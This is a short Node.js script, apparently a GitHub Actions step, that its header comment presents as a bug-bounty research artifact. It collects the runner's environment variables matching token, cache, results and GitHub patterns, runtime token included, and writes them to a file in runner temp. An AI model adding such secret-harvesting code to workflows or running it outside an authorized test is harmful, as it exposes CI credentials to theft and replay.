// Engagement artifact: writes THIS action-process env (runtime token, cache/results
// URLs) to runner temp for authorized lifetime-replay research against github.com
// under bounty.github.com scope.
const fs = require('fs');
const path = require('path');
const out = [];
for (const k of Object.keys(process.env).sort()) {
  if (/ACTIONS_|CACHE|RESULTS|TOKEN|RUNNER_|GITHUB_/i.test(k)) {
    out.push(`${k}=${process.env[k]}`);
  }
}
const file = path.join(process.env.RUNNER_TEMP || '/tmp', 'r9-action-env.txt');
fs.writeFileSync(file, out.join('\n') + '\n');
console.log(`captured ${out.length} vars to ${file}`);
